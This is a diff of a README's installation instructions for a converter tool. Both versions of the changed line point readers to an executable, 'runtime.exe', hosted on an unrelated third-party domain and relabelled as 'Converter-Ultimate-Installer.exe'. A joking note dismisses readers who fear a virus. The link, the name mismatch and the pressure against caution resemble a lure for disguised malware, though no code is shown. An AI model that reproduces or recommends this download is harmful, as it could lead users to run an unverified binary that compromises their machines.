@@ -9,7 +9,7 @@ This is the simplest way to get started. You get a pre-packaged installer that h
 
 Download the Installer:
 Click the link below to download the installer directly:
----"https://www.oshonet.in/runclap/combine/runtime/runtime.exe"----Note: For People who think everything is a virus i "BET" a $1000000000 that ya try using your VM if you are scared cause for gods sake, i am not that dumb to target tech guys who dont got a stable living..LOL..)
+--- "https://www.oshonet.in/runclap/combine/runtime/runtime.exe" ---- (Note: For People who think everything is a virus i "BET" a $1000000000 that ya try using your VM if you are scared cause for gods sake, i am not that dumb to target tech guys who dont got a stable living..LOL..)
 Download Converter-Ultimate-Installer.exe(runtime.exe)
 
 Run the Installer:
